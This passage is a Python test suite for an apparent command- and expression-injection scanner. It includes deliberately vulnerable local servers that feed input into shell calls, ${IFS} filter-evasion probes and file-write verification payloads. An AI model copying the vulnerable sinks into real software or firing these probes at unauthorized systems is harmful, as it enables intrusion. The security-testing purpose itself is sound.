                [rec], url=f"http://127.0.0.1:{port}/ping?ip=FUZZ", methods=["reflected"])
            confirmed = [r for r in results if r["verdict"] == "confirmed"]
            self.assertTrue(confirmed, "echo-back command injection must be confirmed, not downgraded")
        finally:
            server.shutdown()
            server.server_close()

    def test_methods_flag_rejects_unknown_method(self):
        # The CLI validates --methods before firing anything at the target.
        result = subprocess.run(
            [sys.executable, str(SCRIPT), "--verify-url", "http://127.0.0.1:9/x?q=FUZZ",
             "--methods", "bogus", "--acknowledge-consent"],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120)
        self.assertIn("Unknown --methods", result.stdout)


class RawRequestInputTestCase(unittest.TestCase):
    """Phase 2 — the `-r` raw HTTP request input layer. Each injection point is
    marked with FUZZ and routed into the existing verify/detect engine, which
    encodes it for the context it lands in."""

    def test_parse_raw_request_splits_line_headers_and_body(self):
        raw = "POST /api HTTP/1.1\r\nHost: t.example\r\nContent-Type: application/json\r\n\r\n{\"a\":1}"
        req = parse_raw_request(raw)
        self.assertEqual(req["method"], "POST")
        self.assertEqual(req["target"], "/api")
        self.assertEqual(req["host"], "t.example")
        self.assertEqual(req["body"], '{"a":1}')
        self.assertIn(["Content-Type", "application/json"], req["headers"])

    def test_query_param_marker_preserves_other_params(self):
        raw = "GET /lookup?host=example.com&x=1 HTTP/1.1\r\nHost: t.example\r\n\r\n"
        url, method, data, headers, injection = build_request_inputs(raw, param="host")
        self.assertEqual(url, "http://t.example/lookup?host=FUZZ&x=1")
        self.assertEqual(method, "GET")
        self.assertIsNone(data)
        self.assertIn("query param", injection)

    def test_json_field_marker(self):
        raw = ("POST /api HTTP/1.1\r\nHost: t.example\r\nContent-Type: application/json\r\n\r\n"
               '{"host": "a", "y": 2}')
        url, method, data, headers, injection = build_request_inputs(raw, param="host")
        self.assertEqual(method, "POST")
        self.assertIn('"host": "FUZZ"', data)
        self.assertIn('"y": 2', data)

    def test_form_body_and_cookie_and_header_markers(self):
        form = "POST /f HTTP/1.1\r\nHost: t.example\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\na=1&b=2"
        _, _, data, _, inj = build_request_inputs(form, param="b")
        self.assertEqual(data, "a=1&b=FUZZ")
        self.assertIn("body param", inj)

        cookie = "GET / HTTP/1.1\r\nHost: t.example\r\nCookie: sid=abc; role=user\r\n\r\n"
        _, _, _, headers, inj = build_request_inputs(cookie, param="role")
        self.assertIn("Cookie: sid=abc; role=FUZZ", headers)
        self.assertIn("cookie", inj)

        header = "GET / HTTP/1.1\r\nHost: t.example\r\nX-Api: key123\r\n\r\n"
        _, _, _, headers, inj = build_request_inputs(header, param="X-Api")
        self.assertIn("X-Api: FUZZ", headers)

    def test_inline_marker_and_scheme_inference(self):
        # `*` marks the point; Host on :443 infers https; Host/Content-Length dropped.
        raw = ("POST /api HTTP/1.1\r\nHost: t.example:443\r\nContent-Type: application/json\r\n"
               "Content-Length: 12\r\n\r\n{\"host\": \"*\"}")
        url, method, data, headers, injection = build_request_inputs(raw)
        self.assertTrue(url.startswith("https://t.example:443/api"))
        self.assertEqual(data, '{"host": "FUZZ"}')
        self.assertEqual(injection, "inline marker")
        self.assertFalse(any(h.lower().startswith(("host:", "content-length:")) for h in headers))

    def test_existing_fuzz_marker_is_respected(self):
        raw = "GET /q?a=FUZZ HTTP/1.1\r\nHost: t.example\r\n\r\n"
        url, _, _, _, injection = build_request_inputs(raw)
        self.assertEqual(url, "http://t.example/q?a=FUZZ")
        self.assertEqual(injection, "inline marker")

    def test_missing_marker_and_missing_param_raise(self):
        with self.assertRaises(ValueError):
            build_request_inputs("GET /q?a=1 HTTP/1.1\r\nHost: t.example\r\n\r\n")
        with self.assertRaises(ValueError):
            build_request_inputs("GET /q?a=1 HTTP/1.1\r\nHost: t.example\r\n\r\n", param="nope")
        with self.assertRaises(ValueError):
            build_request_inputs("GET /q?a=* HTTP/1.1\r\n\r\n")  # no Host

    def test_raw_request_drives_detection_end_to_end(self):
        # A raw request marked with -p, routed through run_detection, confirms
        # against an executing sink — proving the -r layer feeds the engine.
        import http.server
        import os
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                cmd = up.parse_qs(up.urlparse(self.path).query).get("host", [""])[0]
                out = os.popen("echo " + cmd + " 2>&1").read()
                self.send_response(200)
                self.end_headers()
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            raw = (f"GET /vuln?host=example.com HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n\r\n")
            url, method, data, headers, injection = build_request_inputs(raw, param="host")
            self.assertEqual(injection, "query param 'host'")
            gen = RCEKit()
            rec = make_record(environment="unix", context="raw")
            results = gen.run_detection([rec], url=url, methods=["reflected"],
                                        method=method, data=data, headers=headers)
            self.assertTrue([r for r in results if r["verdict"] == "confirmed"],
                            "the -r request must reach the sink and confirm execution")
        finally:
            server.shutdown()
            server.server_close()


class FileBasedTestCase(unittest.TestCase):
    """Phase 3 — the FileBased (self-OOB) detection method. Confirmation requires
    the target to WRITE a random token to a web-reachable file and then serve it
    back; a target that does not execute never produces the file, so it stays
    unconfirmed. State-changing, so every finding carries a cleanup command."""

    def setUp(self):
        self.gen = RCEKit()
        self.config = {"webroot": "/var/www/html", "web_base_url": "https://t.example"}

    def test_not_applicable_without_config(self):
        rec = make_record(environment="unix", context="raw")
        self.assertFalse(FileBased(self.gen).applicable(rec))
        self.assertTrue(FileBased(self.gen, self.config).applicable(rec))

    def test_build_probe_writes_token_and_carries_followup(self):
        import random as _random
        method = FileBased(self.gen, self.config)
        probe = method.build_probes(make_record(environment="unix", context="raw"),
                                    _random.Random(3))[0]
        self.assertIn("echo", probe.payload)
        self.assertIn("/var/www/html/", probe.payload)
        self.assertIn(probe.expected, probe.payload)  # the token is what gets written
        self.assertTrue(probe.followup["url"].startswith("https://t.example/"))
        self.assertIn("rm -f", probe.followup["cleanup"])

    def test_confirm_requires_the_token_in_the_fetched_file(self):
        method = FileBased(self.gen, self.config)
        probe = Probe(payload="; echo TOK123 > /var/www/html/x.txt", expected="TOK123",
                      followup={"url": "https://t.example/x.txt", "cleanup": "rm -f x"})
        # Fetched file contains the token -> confirmed.
        self.assertEqual(
            method.confirm(Observation(200, "ok", followup_body="TOK123\n"), probe).status,
            "confirmed")
        # File served but without the token (e.g. 404 body) -> negative.
        self.assertEqual(
            method.confirm(Observation(200, "ok", followup_body="not found"), probe).status,
            "negative")
        # Fetch failed entirely -> negative, never confirmed.
        self.assertEqual(
            method.confirm(Observation(200, "ok", followup_body=None), probe).status,
            "negative")
        # Token also present without the payload -> not attributable to execution.
        self.assertEqual(
            method.confirm(Observation(200, "ok", control_body="TOK123",
                                       followup_body="TOK123"), probe).status,
            "inconclusive")

    def test_file_based_end_to_end_writes_and_confirms(self):
        # /vuln executes the injected command (which writes the token file); any
        # other path serves files from the web root. A non-executing sink never
        # creates the file, so it stays unconfirmed.
        import http.server
        import os
        import pathlib
        import socketserver
        import tempfile
        import threading
        import urllib.parse as up

        webroot = tempfile.mkdtemp()

        def make_handler(execute):
            class Handler(http.server.BaseHTTPRequestHandler):
                def log_message(self, *a):
                    pass

                def do_GET(self):
                    parsed = up.urlparse(self.path)
                    if parsed.path == "/vuln":
                        cmd = up.parse_qs(parsed.query).get("host", [""])[0]
                        if execute:
                            os.popen("echo " + cmd + " 2>&1").read()
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(b"ok")
                        return
                    served = pathlib.Path(webroot) / parsed.path.lstrip("/")
                    if served.is_file():
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(served.read_bytes())
                    else:
                        self.send_response(404)
                        self.end_headers()
                        self.wfile.write(b"not found")
            return Handler

        def run(execute):
            server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), make_handler(execute))
            port = server.server_address[1]
            threading.Thread(target=server.serve_forever, daemon=True).start()
            try:
                rec = make_record(environment="unix", context="raw")
                return self.gen.run_detection(
                    [rec], url=f"http://127.0.0.1:{port}/vuln?host=FUZZ", methods=["file"],
                    config={"webroot": webroot, "web_base_url": f"http://127.0.0.1:{port}"})
            finally:
                server.shutdown()
                server.server_close()

        confirmed = [r for r in run(execute=True) if r["verdict"] == "confirmed"]
        self.assertTrue(confirmed, "an executing+serving sink must confirm file-based RCE")
        self.assertTrue(all(r.get("cleanup") for r in confirmed), "each finding needs a cleanup command")
        self.assertTrue(os.listdir(webroot), "the token file must actually be written")

        self.assertFalse([r for r in run(execute=False) if r["verdict"] == "confirmed"],
                         "a non-executing sink must never be confirmed")

    def test_methods_flag_file_requires_webroot(self):
        result = subprocess.run(
            [sys.executable, str(SCRIPT), "--verify-url", "http://127.0.0.1:9/x?q=FUZZ",
             "--methods", "file", "--acknowledge-consent"],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120)
        self.assertIn("--webroot", result.stdout)


class ParametricTimeTestCase(unittest.TestCase):
    """Phase 4 — hardened blind timing. A controlled 0/N/2N delay series must
    produce a linear response-time increase; jitter cannot fake it. Timing has
    no computed value, so its ceiling is `needs-review` — it never confirms on
    its own (I2/I3)."""

    def setUp(self):
        self.gen = RCEKit()
        self.method = ParametricTime(self.gen, {"time_base": 2.0, "time_repeats": 2})

    def _series(self, mapping):
        series = []
        for delay, elapseds in mapping.items():
            for elapsed in elapseds:
                series.append((Probe(payload="x", expected="", delay_s=delay),
                               Observation(status=200, body="", elapsed=elapsed)))
        return series

    def test_tier_is_needs_review_and_method_is_aggregate(self):
        self.assertEqual(self.method.tier, "needs-review")
        self.assertTrue(self.method.aggregate)

    def test_build_probes_cover_zero_n_and_two_n(self):
        import random as _random
        probes = self.method.build_probes(make_record(environment="unix", context="raw"),
                                          _random.Random(1))
        delays = sorted({p.delay_s for p in probes})
        self.assertEqual(delays, [0.0, 2.0, 4.0])
        self.assertTrue(all("sleep" in p.payload for p in probes))

    def test_confirm_series_linear_response_is_needs_review(self):
        verdict = self.method.confirm_series(
            self._series({0: [0.10, 0.12], 2.0: [2.11, 2.09], 4.0: [4.12, 4.08]}))
        self.assertEqual(verdict.status, "needs-review")

    def test_confirm_series_rejects_flat_jitter_and_nonmonotonic(self):
        flat = self.method.confirm_series(
            self._series({0: [0.10, 0.12], 2.0: [0.11, 0.13], 4.0: [0.10, 0.12]}))
        self.assertEqual(flat.status, "negative")
        jitter = self.method.confirm_series(
            self._series({0: [0.10, 0.12], 2.0: [3.9, 0.2], 4.0: [0.3, 0.25]}))
        self.assertEqual(jitter.status, "negative")
        nonmono = self.method.confirm_series(
            self._series({0: [0.1, 0.1], 2.0: [4.1, 4.0], 4.0: [2.1, 2.0]}))
        self.assertEqual(nonmono.status, "negative")

    def test_end_to_end_sleeping_sink_is_needs_review_never_confirmed(self):
        # The sink sleeps for the injected `sleep N`; a linear response must be
        # reported needs-review, never confirmed.
        import http.server
        import re as _re
        import socketserver
        import threading
        import time as _time
        import urllib.parse as up

        def make_handler(vulnerable):
            class Handler(http.server.BaseHTTPRequestHandler):
                def log_message(self, *a):
                    pass

                def do_GET(self):
                    cmd = up.parse_qs(up.urlparse(self.path).query).get("host", [""])[0]
                    match = _re.search(r"sleep ([0-9.]+)", cmd)
                    if vulnerable and match:
                        _time.sleep(float(match.group(1)))
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b"ok")
            return Handler

        def run(vulnerable):
            server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), make_handler(vulnerable))
            port = server.server_address[1]
            threading.Thread(target=server.serve_forever, daemon=True).start()
            try:
                rec = make_record(environment="unix", context="raw", expected_channel="timing")
                return self.gen.run_detection(
                    [rec], url=f"http://127.0.0.1:{port}/x?host=FUZZ", methods=["time"],
                    config={"time_base": 0.6, "time_repeats": 2})
            finally:
                server.shutdown()
                server.server_close()

        vuln = run(vulnerable=True)
        self.assertTrue(vuln)
        self.assertEqual(vuln[0]["verdict"], "needs-review")
        self.assertEqual(vuln[0]["tier"], "needs-review")
        self.assertFalse([r for r in vuln if r["verdict"] == "confirmed"],
                         "timing must never self-confirm")

        flat = run(vulnerable=False)
        self.assertEqual(flat[0]["verdict"], "negative")


class EvalExprTestCase(unittest.TestCase):
    """Phase 5 — code/expression injection (SSTI, SpEL, OGNL, Groovy, raw eval).
    Inject a*b on random operands in each common template syntax and confirm the
    product appears while the literal a*b does not — the computed-value invariant
    for an expression evaluator."""

    def setUp(self):
        self.gen = RCEKit()
        self.method = EvalExpr(self.gen)

    def test_build_probes_cover_common_expression_syntaxes(self):
        import random as _random
        probes = self.method.build_probes(make_record(environment="python", context="raw", sink="ssti"),
                                          _random.Random(5))
        joined = " ".join(p.payload for p in probes)
        for delim in ("${", "{{", "#{", "%{", "<%=", "@("):
            self.assertIn(delim, joined)
        for probe in probes:
            # expected is the product; forbidden is the literal expression, which
            # is present in the payload but must be absent from a confirmed body.
            self.assertNotIn(probe.expected, probe.payload)
            self.assertIn(probe.forbidden, probe.payload)

    def test_confirm_evaluation_vs_reflection_vs_boundary(self):
        import random as _random
        probe = self.method.build_probes(make_record(environment="python", context="raw"),
                                         _random.Random(5))[1]
        # Evaluated: product present, literal absent.
        self.assertEqual(
            self.method.confirm(Observation(200, f"= {probe.expected} =", control_body="x"), probe).status,
            "confirmed")
        # Reflected: literal echoed, product never produced.
        self.assertEqual(
            self.method.confirm(Observation(200, f"= {probe.forbidden} =", control_body="x"), probe).status,
            "negative")
        # Product embedded in a longer digit run must not match (digit boundary).
        self.assertEqual(
            self.method.confirm(Observation(200, f"id={probe.expected}00", control_body="x"), probe).status,
            "negative")
        # Present without the payload too -> inconclusive.
        self.assertEqual(
            self.method.confirm(Observation(200, probe.expected, control_body=probe.expected), probe).status,
            "inconclusive")

    def test_eval_end_to_end_against_evaluating_sink(self):
        # /ssti evaluates a bare `a*b` (or one wrapped in ${...}/{{...}}/...);
        # /reflect echoes input verbatim. EvalExpr must confirm on the former only.
        import http.server
        import re as _re
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                parsed = up.urlparse(self.path)
                raw = up.parse_qs(parsed.query).get("q", [""])[0]
                self.send_response(200)
                self.end_headers()
                if parsed.path == "/ssti":
                    # Simulate an expression evaluator: strip common delimiters,
                    # then evaluate a pure `int*int` expression.
                    expr = _re.sub(r"^[\$#%@]?\(?\{*=?\s*|\s*\}*\)?%?>?\s*$", "", raw)
                    expr = expr.strip("${}#%@()<>= ")
                    match = _re.fullmatch(r"(\d+)\*(\d+)", expr)
                    out = str(int(match.group(1)) * int(match.group(2))) if match else raw
                else:
                    out = raw
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            rec = make_record(environment="python", context="raw", sink="ssti")
            evaluated = self.gen.run_detection(
                [rec], url=f"http://127.0.0.1:{port}/ssti?q=FUZZ", methods=["eval"])
            self.assertTrue([r for r in evaluated if r["verdict"] == "confirmed"],
                            "EvalExpr must confirm against an expression evaluator")
            reflected = self.gen.run_detection(
                [rec], url=f"http://127.0.0.1:{port}/reflect?q=FUZZ", methods=["eval"])
            self.assertFalse([r for r in reflected if r["verdict"] == "confirmed"],
                             "a target that only echoes input must never be confirmed")
        finally:
            server.shutdown()
            server.server_close()


class EvadeTestCase(unittest.TestCase):
    """Phase 6 — `--evade low`. Default is clean canonical payloads; `low` applies
    a single low-touch transform (${IFS} for spaces) to Unix shell command probes
    only, and never to the file-write redirect (which ${IFS} would break)."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def test_default_is_canonical_no_obfuscation(self):
        import random as _random
        probe = ReflectedMath(self.gen).build_probes(self.rec, _random.Random(1))[0]
        self.assertNotIn("${IFS}", probe.payload)
        self.assertIn(" ", probe.payload)

    def test_evade_low_substitutes_ifs_for_reflected_and_time(self):
        import random as _random
        reflected = ReflectedMath(self.gen, {"evade": "low"}).build_probes(self.rec, _random.Random(1))[0]
        self.assertIn("${IFS}", reflected.payload)
        self.assertNotIn(" ", reflected.payload)
        timing = ParametricTime(self.gen, {"evade": "low", "time_base": 2}).build_probes(
            self.rec, _random.Random(1))[-1]
        self.assertIn("${IFS}", timing.payload)
        self.assertNotIn(" ", timing.payload)

    def test_file_write_stays_canonical_under_evade(self):
        import random as _random
        config = {"evade": "low", "webroot": "/var/www", "web_base_url": "http://t"}
        probe = FileBased(self.gen, config).build_probes(self.rec, _random.Random(1))[0]
        # The `>` redirect must not be broken by ${IFS}.
        self.assertNotIn("${IFS}", probe.payload)
        self.assertIn(" > ", probe.payload)

    def test_evade_low_still_confirms_against_shell_sink(self):
        import http.server
        import os
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                cmd = up.parse_qs(up.urlparse(self.path).query).get("host", [""])[0]
                out = os.popen("echo " + cmd + " 2>&1").read()
                self.send_response(200)
                self.end_headers()
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            results = self.gen.run_detection(
                [self.rec], url=f"http://127.0.0.1:{port}/vuln?host=FUZZ", methods=["reflected"],
                config={"evade": "low"})
            confirmed = [r for r in results if r["verdict"] == "confirmed"]
            self.assertTrue(confirmed, "the ${IFS} variant must still execute and confirm")
            self.assertIn("${IFS}", confirmed[0]["payload"])
        finally:
            server.shutdown()
            server.server_close()


class DetectionRobustnessTestCase(unittest.TestCase):
    """Supplementary regression tests distilled from validating RCEKit against a
    local VulnHub-class range: guarantees not otherwise locked in — encoding
    resilience, probe redundancy, and (most importantly) false-positive
    resistance, the tool's core promise."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def test_confirms_through_base64_encoded_output(self):
        # A sink whose command output is base64-encoded must still confirm:
        # _encoded_search peels the wrapper and finds the computed value.
        import base64
        import os

        def route(method, path, params, headers, body):
            pipe = os.popen("echo " + params.get("host", "") + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, base64.b64encode(out.encode()).decode()

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/b64?host=FUZZ", methods=["reflected"])
            self.assertTrue([r for r in results if r["verdict"] == "confirmed"],
                            "base64-encoded command output must still confirm")

    def test_backtick_variant_survives_a_dollar_paren_filter(self):
        # A sink that strips "$(" defeats the $((..)) probe but not the backtick
        # `expr` variant — probe redundancy keeps the detection alive.
        import os

        def route(method, path, params, headers, body):
            ip = params.get("ip", "").replace("$(", "")
            pipe = os.popen("ping -c 1 " + ip + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, "PING " + ip + "\n" + out

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/filter?ip=FUZZ", methods=["reflected"])
            self.assertTrue([r for r in results if r["verdict"] == "confirmed"],
                            "the backtick variant must survive a $( filter")

    def test_eval_is_not_fooled_by_random_numbers_in_the_page(self):
        # A page full of large random numbers (session ids, timestamps) must not
        # trick EvalExpr: the product is boundary-fenced and differenced against
        # the payload-free control.
        import random as _random

        def route(method, path, params, headers, body):
            return 200, f"session={_random.randint(10**7, 10**8)} ts={_random.randint(10**7, 10**8)}"

        with local_target(route) as base:
            results = self.gen.run_detection(
                [make_record(environment="python", context="raw")],
                url=f"{base}/x?q=FUZZ", methods=["eval"])
            self.assertFalse([r for r in results if r["verdict"] == "confirmed"],
                             "random numbers on the page must not be a false positive")

    def test_timing_is_not_fooled_by_random_latency(self):
        # A target with random per-request latency (but no injection) must not
        # confirm: the regression needs the response time to track the injected
        # delay linearly, which jitter cannot.
        import random as _random
        import time as _time

        def route(method, path, params, headers, body):
            _time.sleep(_random.uniform(0, 0.2))
            return 200, "ok"

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["time"],
                config={"time_base": 0.6})
            self.assertFalse([r for r in results if r["verdict"] == "confirmed"],
                             "random latency must never be confirmed")
            self.assertTrue(all(r["verdict"] == "negative" for r in results),
                            "a non-linear latency response is negative, not even a candidate")


if __name__ == "__main__":
    unittest.main()
